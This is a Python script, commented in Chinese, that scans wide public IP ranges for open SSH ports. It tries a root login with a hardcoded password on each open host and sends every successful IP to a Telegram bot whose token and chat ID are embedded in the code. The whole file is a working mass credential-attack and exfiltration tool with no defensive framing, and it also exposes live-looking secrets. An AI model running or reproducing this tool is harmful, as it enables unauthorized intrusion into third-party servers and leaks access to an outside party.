import asyncio
import paramiko
import socket
import requests
from aiohttp import ClientSession

# 生成指定范围内的IP列表（使用生成器减少内存占用）
def ip_list_in_range(start_ip, end_ip):
    start_parts = list(map(int, start_ip.split('.')))
    end_parts = list(map(int, end_ip.split('.')))
    
    for i in range(start_parts[0], end_parts[0] + 1):
        for j in range(start_parts[1] if i == start_parts[0] else 0, end_parts[1] + 1 if i == end_parts[0] else 256):
            for k in range(start_parts[2] if i == start_parts[0] and j == start_parts[1] else 0, end_parts[2] + 1 if i == end_parts[0] and j == end_parts[1] else 256):
                for l in range(start_parts[3] if i == start_parts[0] and j == start_parts[1] and k == start_parts[2] else 0, end_parts[3] + 1 if i == end_parts[0] and j == end_parts[1] and k == start_parts[2] else 256):
                    yield f"{i}.{j}.{k}.{l}"

# 检测IP的22端口是否开放（异步）
async def check_port(ip, semaphore):
    port = 22
    timeout = 3
    async with semaphore:  # 控制并发量
        try:
            reader, writer = await asyncio.open_connection(ip, port)
            writer.close()
            await writer.wait_closed()
            return True
        except (asyncio.TimeoutError, ConnectionRefusedError):
            return False

# 使用SSH进行登录尝试（异步）
async def try_ssh_login(ip, semaphore):
    username = 'root'
    password = 'NP1215GP55*3*AACAAC'
    async with semaphore:  # 控制并发量
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=22, username=username, password=password, timeout=5)
            ssh.close()
            return True
        except (paramiko.AuthenticationException, paramiko.SSHException):
            return False
        except Exception as e:
            return False

# 发信息给TG机器人（异步）
async def send_message_to_telegram(message, session):
    bot_token = "8153892091:AAE97Mg3YjSuz_sFUUbVaqzLMSUe6X0YMWk"
    chat_id = "6260718977"
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {"chat_id": chat_id, "text": message}
    
    try:
        async with session.get(url, params=params) as response:
            if response.status == 200:
                print(f"Message sent to {message}")
            else:
                print(f"Failed to send message. Status code: {response.status}")
    except Exception as e:
        print(f"Error while sending message: {e}")

# 执行扫描任务的协程
async def scan_ip(ip, session, semaphore):
    # 1. 检查22端口是否开放
    if await check_port(ip, semaphore):
        # 2. 如果端口开放，尝试SSH登录
        if await try_ssh_login(ip, semaphore):
            print(f"成功登录到 {ip}")
            await send_message_to_telegram(ip, session)
        else:
            print(f"登录失败: {ip}")
    else:
        print(f"IP {ip} 端口关闭")

# 主执行函数
async def main():
    ip_ranges = [
        ('3.7.1.1', '3.255.255.255'),
        ('18.96.1.0', '18.237.255.255'),
        ('54.150.1.0', '54.255.255.255')
    ]
    
    # 使用aiohttp来管理HTTP请求
    async with ClientSession() as session:
        semaphore = asyncio.Semaphore(10)  # 设置并发请求数为10，可以根据需要调整
        
        tasks = []
        for start_ip, end_ip in ip_ranges:
            # 为每个IP生成扫描任务并添加到任务列表中
            ip_generator = ip_list_in_range(start_ip, end_ip)
            for ip in ip_generator:
                task = scan_ip(ip, session, semaphore)
                tasks.append(task)

        # 并发执行所有任务
        await asyncio.gather(*tasks)

# 启动程序
if __name__ == "__main__":
    asyncio.run(main())
